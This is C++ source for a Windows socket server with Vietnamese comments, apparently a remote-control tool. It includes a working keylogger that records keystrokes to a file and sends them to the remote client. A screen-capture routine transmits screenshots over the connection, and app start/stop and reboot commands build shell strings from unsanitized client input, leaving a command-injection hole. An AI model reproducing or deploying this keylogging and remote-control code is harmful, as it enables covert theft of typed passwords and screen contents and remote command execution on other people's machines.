#include <winsock2.h>
#include <iostream>
#include <windows.h>
#include<string>
#include <ws2tcpip.h>
#include<filesystem>
#include<fstream>
#include<thread>
#pragma comment(lib, "ws2_32.lib")  // Link thư viện Winsock
namespace fs = std::filesystem;
#define PORT 8080
#define BUFFER_SIZE 4096

void StartKeylogger(SOCKET clientSocket) {
    std::ofstream logFile("log.txt");
    if (!logFile.is_open()) {
        std::cerr << "Không thể mở file log!" << std::endl;
        return;
    }

    std::string keyBuffer;
    auto lastKeyPressTime = std::chrono::steady_clock::now();

    while (true) {
        for (int key = 8; key <= 255; key++) {
            SHORT keyState = GetAsyncKeyState(key);


            if (keyState & 0b1) {
                std::string keyLog = "";

                switch (key) {
                case VK_SPACE: keyLog = "[SPACE] "; break;
                case VK_ESCAPE: keyLog = "[ESC] "; break;
                case VK_RETURN: keyLog = "[ENTER] "; break;
                case VK_TAB: keyLog = "[TAB] "; break;
                case VK_SHIFT: keyLog = "[SHIFT] "; break;
                case VK_BACK: keyLog = "[BACKSPACE] "; break;
                case VK_RBUTTON: keyLog = "[RIGHT_CLICK] "; break;
                case VK_LBUTTON: keyLog = "[LEFT_CLICK] "; break;
                case VK_CONTROL: keyLog = "[CTRL] "; break;
                case VK_MENU: keyLog = "[ALT] "; break;
                case VK_CAPITAL: keyLog = "[CAPS_LOCK] "; break;
                case VK_LEFT: keyLog = "[LEFT] "; break;      // Phím mũi tên trái
                case VK_RIGHT: keyLog = "[RIGHT] "; break;    // Phím mũi tên phải
                case VK_UP: keyLog = "[UP] "; break;          // Phím mũi tên lên
                case VK_DOWN: keyLog = "[DOWN] "; break;      // Phím mũi tên xuống
                case 0x30: keyLog = "[0] "; break;                  // Phím 0
                case 0x31: keyLog = "[1] "; break;                  // Phím 1
                case 0x32: keyLog = "[2] "; break;                  // Phím 2
                case 0x33: keyLog = "[3] "; break;                  // Phím 3
                case 0x34: keyLog = "[4] "; break;                  // Phím 4
                case 0x35: keyLog = "[5] "; break;                  // Phím 5
                case 0x36: keyLog = "[6] "; break;                  // Phím 6
                case 0x37: keyLog = "[7] "; break;                  // Phím 7
                case 0x38: keyLog = "[8] "; break;                  // Phím 8
                case 0x39: keyLog = "[9] "; break;                  // Phím 9
                case VK_OEM_PLUS: keyLog = "[+] "; break;           // Phím +
                case VK_OEM_MINUS: keyLog = "[-] "; break;          // Phím -
                case VK_OEM_5: keyLog = "[|] "; break;              // Phím 
                case VK_OEM_7: keyLog = "['] "; break;
                case VK_OEM_COMMA: keyLog = "[,] "; break;          // Phím ,
                case VK_OEM_PERIOD: keyLog = "[.] "; break;
                case VK_OEM_1: keyLog = "[;] "; break;          // Phím .
                case VK_OEM_2: keyLog = "[/] "; break;              // Phím /
                case VK_OEM_3: keyLog = "[`] "; break;
                case VK_LWIN: keyLog = "[WINDOWS] "; break;  // Phím Windows trái
                case VK_F1: keyLog = "[F1] "; break;
                case VK_F2: keyLog = "[F2] "; break;
                case VK_F3: keyLog = "[F3] "; break;
                case VK_F4: keyLog = "[F4] "; break;
                case VK_F5: keyLog = "[F5] "; break;
                case VK_F6: keyLog = "[F6] "; break;
                case VK_F7: keyLog = "[F7] "; break;
                case VK_F8: keyLog = "[F8] "; break;
                case VK_F9: keyLog = "[F9] "; break;
                case VK_F10: keyLog = "[F10] "; break;
                case VK_F11: keyLog = "[F11] "; break;
                case VK_F12: keyLog = "[F12] "; break;
                default:
                    if (isalpha(key)) {

                        keyLog += (char)key;
                    }
                    break;
                }
                if (!keyLog.empty()) {
                    if (logFile.fail()) {
                        std::cerr << "Gặp lỗi khi ghi vào file log." << std::endl;
                    }
                    logFile << keyLog;
                    logFile.flush();
                    keyBuffer += keyLog;
                    lastKeyPressTime = std::chrono::steady_clock::now();  // Cập nhật thời điểm nhấn phím
                }
            }
        }

        auto currentTime = std::chrono::steady_clock::now();
        auto timeSinceLastPress = std::chrono::duration_cast<std::chrono::seconds>(currentTime - lastKeyPressTime);

        if (timeSinceLastPress.count() >= 3 && !keyBuffer.empty()) {
            std::cout << "Da gui log den client\n";
            int bytesSent = send(clientSocket, keyBuffer.c_str(), keyBuffer.size(), 0);
            if (bytesSent == SOCKET_ERROR) {
                std::cerr << "Loi gui du lieu toi client." << std::endl;
            }
            keyBuffer.clear();  // Xóa bộ đệm sau khi gửi
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    logFile.close();
}
void captureScreen(const std::string& filename) {
    int x1 = 0, y1 = 0;
    int x2 = GetSystemMetrics(SM_CXSCREEN);
    int y2 = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, x2, y2);
    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, x2, y2, hScreen, x1, y1, SRCCOPY);
    ReleaseDC(NULL, hScreen);

    BITMAPFILEHEADER fileHeader;
    BITMAPINFOHEADER infoHeader;
    fileHeader.bfType = 0x4D42;
    fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fileHeader.bfSize = fileHeader.bfOffBits + (x2 * y2 * 4);
    fileHeader.bfReserved1 = 0;
    fileHeader.bfReserved2 = 0;

    infoHeader.biSize = sizeof(BITMAPINFOHEADER);
    infoHeader.biWidth = x2;
    infoHeader.biHeight = -y2;
    infoHeader.biPlanes = 1;
    infoHeader.biBitCount = 32;
    infoHeader.biCompression = BI_RGB;
    infoHeader.biSizeImage = 0;
    infoHeader.biXPelsPerMeter = 0;
    infoHeader.biYPelsPerMeter = 0;
    infoHeader.biClrUsed = 0;
    infoHeader.biClrImportant = 0;

    std::ofstream file(filename, std::ios::out | std::ios::binary);
    file.write((char*)&fileHeader, sizeof(fileHeader));
    file.write((char*)&infoHeader, sizeof(infoHeader));

    int imageSize = x2 * y2 * 4;
    char* bmpData = new char[imageSize];
    GetDIBits(hDC, hBitmap, 0, y2, bmpData, (BITMAPINFO*)&infoHeader, DIB_RGB_COLORS);
    file.write(bmpData, imageSize);
    delete[] bmpData;

    file.close();
    DeleteObject(hBitmap);
    DeleteDC(hDC);
}
void sendScreenshot(SOCKET clientSocket) {
    captureScreen("screenshot.bmp");

    std::ifstream file("screenshot.bmp", std::ios::binary | std::ios::ate);
    int fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    // Gửi kích thước ảnh trước
    send(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);

    char buffer[BUFFER_SIZE];
    int bytesSent = 0;

    while (bytesSent < fileSize) {
        file.read(buffer, BUFFER_SIZE);
        int bytesRead = file.gcount();
        int result = send(clientSocket, buffer, bytesRead, 0);

        if (result == SOCKET_ERROR) {
            std::cerr << "Error sending data.\n";
            break;
        }
        bytesSent += result;
    }
    file.close();
}

void reset(const std::string& buffer) {
    if (std::string(buffer) == "RESET") {
        std::cout << "Resetting server..." << std::endl;
        system("shutdown /r");  // Lệnh reset server trên Windows
    }
}
bool stopApplicationByName(const std::string& appName) {
    std::string command = "taskkill /IM "+appName+" /F";
    int result = system(command.c_str());
    return result == 0;
}
bool startApp(const std::string& appName) {
    //STARTUPINFOA si;
    //PROCESS_INFORMATION pi;
    //ZeroMemory(&si, sizeof(si));
    //si.cb = sizeof(si);
    //ZeroMemory(&pi, sizeof(pi));

    //// Sử dụng `CreateProcessA` với chuỗi kiểu `char*`
    //if (!CreateProcessA(
    //    NULL, (LPSTR)appPath.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi
    //)) {
    //    std::cerr << "Can't run app: " << GetLastError() << std::endl;
    //    return false;
    //}

    //// Đóng các handle của quá trình và luồng
    //CloseHandle(pi.hProcess);
    //CloseHandle(pi.hThread);
    //return true;
    std::string command = "start " + appName ;
    int result = system(command.c_str());
    return result == 0;
}
bool Listapp(const std::string& filename) {
    // Thực thi lệnh tasklist để lấy danh sách tiến trình
    /*std::ifstream ip("tasklist /FI \"SESSIONNAME eq Console\"");
    if (!ip.is_open()) {
        std::cerr << "tasklist fail" << std::endl;
        return false;
    }
    std::ofstream op(filename);
    std::string line;
    while (getline(ip, line)) {
        op << line << std::endl;
    }
    ip.close();
    op.close();*/
    // Lệnh tasklist lọc chỉ ứng dụng đang chạy
    std::string command = "tasklist /FI \"SESSIONNAME eq Console\" /FO LIST > " + filename;
    int result = system(command.c_str());

    if (result == 0) {
        return true;
    }
    else {
        return false;
    }
}
bool ListService(const std::string& filename) {
    // Thực thi lệnh tasklist để lấy danh sách tiến trình
   /* std::ifstream ip("tasklist /FI \"SESSIONNAME eq Service\"");
    if (!ip.is_open()) {
        std::cerr << "tasklist fail" << std::endl;
        return false;
    }
    std::ofstream op(filename);
    std::string line;
    while (getline(ip, line)) {
        op << line << std::endl;
    }
    ip.close();
    op.close();*/
    // Lệnh tasklist lọc chỉ ứng dụng đang chạy
    std::string command = "tasklist /FI \"SESSIONNAME eq Service\" /FO LIST > " + filename;
    int result = system(command.c_str());

    if (result == 0) {
        return true;
    }
    else {
        return false;
    }
}
void findAndOpenExecutable(const fs::path& directory, const std::string& exeName) {
    try {
        for (const auto& entry : fs::recursive_directory_iterator(directory)) {
            if (entry.is_regular_file() && entry.path().extension() == ".exe") {
                if (entry.path().filename() == exeName) {
                    std::cout << "Đã tìm thấy ứng dụng: " << entry.path().string() << std::endl;

                    // Mở ứng dụng
                    if (startApp(entry.path().string())) {
                        std::cout << "Ứng dụng đã được khởi chạy thành công." << std::endl;
                    }
                    else {
                        std::cout << "Lỗi khi khởi chạy ứng dụng." << std::endl;
                    }
                    return; // Kết thúc sau khi tìm và mở ứng dụng
                }
            }
        }
    }
    catch (const fs::filesystem_error& e) {
        std::cerr << "Loi: " << e.what() << std::endl;
    }
}
int main() {
    WSADATA wsa;
    SOCKET serverSocket, clientSocket;
    sockaddr_in serverAddr, clientAddr;
    int addrLen = sizeof(clientAddr);

    // Khởi tạo Winsock
    std::cout << "Initializing Winsock..." << std::endl;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cerr << "WSAStartup failed. Error Code: " << WSAGetLastError() << std::endl;
        return 1;
    }

    // Tạo socket
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed. Error Code: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    // Cấu hình địa chỉ server
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    // Gán socket với địa chỉ và cổng
    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed. Error Code: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    // Lắng nghe kết nối từ client
    listen(serverSocket, 3);
    std::cout << "Waiting for client connections..." << std::endl;

    // Chấp nhận kết nối từ client
    clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &addrLen);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Accept failed. Error Code: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    std::cout << "Client connected." << std::endl;
   char buffer[BUFFER_SIZE];
   while (true) {
       memset(buffer, 0, sizeof(buffer));
       int bytes_received = recv(clientSocket, buffer, sizeof(buffer), 0);
       if (bytes_received > 0) {
           std::cout << "Command from Client: " << buffer << std::endl;
           // Xử lý lệnh từ client
           if (strcmp(buffer, "List app") == 0) {
               //runCommand(clientSocket);
               // Gửi chuỗi thông báo kết thúc
               std::string endMessage = "END_OF_RESPONSE";
               send(clientSocket, endMessage.c_str(), endMessage.length(), 0);
           }
           else if (strcmp(buffer, "Stop app") == 0) {
               recv(clientSocket, buffer, sizeof(buffer), 0);
               if (stopApplicationByName(buffer)) {
                   std::string successMessage = "success nho";
                   send(clientSocket, successMessage.c_str(), successMessage.length(), 0);
               }
               else {
                   std::string errorMessage = "cant stop";
                   send(clientSocket, errorMessage.c_str(), errorMessage.length(), 0);
               }
           }
           else if (strcmp(buffer, "Start app") == 0) {
               recv(clientSocket, buffer, sizeof(buffer), 0);
               if (startApp(buffer)) {
                   std::string successMessage = "success nho";
                   send(clientSocket, successMessage.c_str(), successMessage.length(), 0);
               }
               else {
                   std::string errorMessage = "cant stop";
                   send(clientSocket, errorMessage.c_str(), errorMessage.length(), 0);
               }
           }
           else if (strcmp(buffer, "Screen shot")==0) {
               sendScreenshot(clientSocket);
           }
           else if (strcmp(buffer, "Exit") == 0) {
               std::cout << "Client disconnected." << std::endl;
               break;
           }
           else {
               std::cout <<buffer <<" is invalid command"<< std::endl;
               std::string response = "Invalid command";
               send(clientSocket, response.c_str(), response.size(), 0);
           }
       }
       else if (bytes_received == SOCKET_ERROR) {
           std::cerr << "cant transport data: " << WSAGetLastError() << std::endl;
           break;
       }
   }

    // Đóng socket và dọn dẹp Winsock
    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();

    return 0;
}
